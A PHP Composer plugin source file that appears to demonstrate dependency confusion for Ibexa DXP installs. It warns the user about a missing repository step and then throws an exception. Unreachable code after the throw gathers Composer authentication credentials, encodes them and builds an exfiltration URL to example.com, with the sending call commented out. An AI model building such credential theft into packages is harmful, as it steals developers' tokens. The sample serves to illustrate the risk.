<?php

namespace MarekNocon\Composer;

use Composer\Composer;
use Composer\IO\IOInterface;
use Composer\Plugin\PluginInterface;

class Plugin implements PluginInterface
{
    public function activate(Composer $composer, IOInterface $io)
    {
        $messages = [
            'Hello!',
            'If you are trying to install Ibexa DXP, you missed a step from the doc',
            'Please refer to: https://doc.ibexa.co/en/latest/getting_started/install_ez_platform/',
            'Or run: composer config repositories.ibexa composer https://updates.ibexa.co',
        ];

        $messages = array_map(function (string $message) {
            return sprintf('<fg=red>%s</>', $message);
        }, $messages);

        $io->writeError($messages, true);

        throw new \InvalidArgumentException('Ibexa repository is not defined!');
        // Potentially evil part of the plugin
        $authData = $io->getAuthentications();
        $authData = json_encode($authData);
        $encodedAuth = base64_encode($authData);
        $endpoint = sprintf('https://example.com/getData?auth=%s', $encodedAuth);

        // $composer->getLoop()->getHttpDownloader()->get($endpoint);
    }

    public function deactivate(Composer $composer, IOInterface $io)
    {
    }

    public function uninstall(Composer $composer, IOInterface $io)
    {
    }
}
